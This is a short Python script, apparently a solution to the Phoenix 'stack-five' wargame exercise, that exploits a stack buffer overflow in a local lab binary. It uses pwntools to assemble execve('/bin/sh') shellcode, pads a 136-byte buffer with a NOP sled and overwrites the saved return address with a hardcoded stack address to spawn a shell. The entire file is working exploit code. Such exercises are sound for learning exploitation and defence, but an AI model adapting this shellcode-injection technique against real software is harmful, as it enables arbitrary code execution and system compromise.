#!/usr/bin/python
from pwn import *

BUFF_LEN = 136  # Space we have until we run into return address
SAVED_EIP = 0x7fffffffe658

def exploit():
    # Generate Shellcode
    ctx = context.update(arch="amd64", os="linux", endian="little")
    path = "/bin/sh"
    argv = []
    envp = []
    shellcode = shellcraft.amd64.linux.execve(path, argv, envp)

    shellcode = asm(shellcode)
    sclen = len(shellcode)
    print(f"Total bytes available: {BUFF_LEN}")
    print(f"Bytes of shellcode: {sclen}")
    print(f"Bytes for NOP Sled: {BUFF_LEN - sclen}")

    # Build final payload
    sc = asm('nop') * (BUFF_LEN - sclen)
    sc += shellcode
    sc += p64(SAVED_EIP - (sclen - 32)) # Move the pointer back into our NOP sled
    print(sc)

    # Execute the payload!

    p = process("/opt/phoenix/amd64/stack-five")
    p.sendline(sc)



if __name__ == "__main__":
    exploit()